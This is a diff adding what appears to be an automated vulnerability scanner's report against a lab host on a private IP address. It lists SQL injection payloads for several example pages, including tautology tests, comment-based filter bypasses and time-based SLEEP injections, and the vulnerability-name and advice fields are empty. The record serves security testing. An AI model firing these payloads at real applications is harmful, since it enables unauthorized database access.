@@ -1,0 +1,104 @@
+Target: http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '	and	'92769'='92769
+'	and	'28048'='28048
+'	or	13853=13853#
+'	and	'36847'='36848
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example2.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '	and	'92769'='92769
+'	and	'28048'='28048
+'	or	13853=13853#
+'	and	'36847'='36848
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example3.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '/**/and/**/'47751'='47751
+'/**/and/**/'17593'='17593
+'/**/or/**/20186=20186#
+'/**/and/**/'59156'='59157
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example4.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 	and	50335=50335
+	and	15380=15380
+	or	65118=65118#
+	and	95864=95865
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example5.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 	and	50335=50335
+	and	15380=15380
+	or	65118=65118#
+	and	95864=95865
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example6.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 	and	50335=50335
+	and	15380=15380
+	or	65118=65118#
+	and	95864=95865
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example7.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 
+and
+52527=52527
+
+and
+98902=98902
+
+or
+69789=69789#
+
+and
+28756=28757
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example8.php (GET)
+VulnName: 
+Query: {'order': 'name'}
+Payload: ` or SLEEP(3);-- 
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example9.php (GET)
+VulnName: 
+Query: {'order': 'name'}
+Payload:  or SLEEP(3);-- 
+Advice: 
+---
+---
+URL:http://192.168.42.133/xml/example2.php (GET)
+VulnName: 
+Query: {'name': 'hacker'}
+Payload: '+and+'92621'='92621
+'+and+'6910'='6910
+'+or+8788=8788#
+'+and+'34249'='34250
+Advice: 
+---
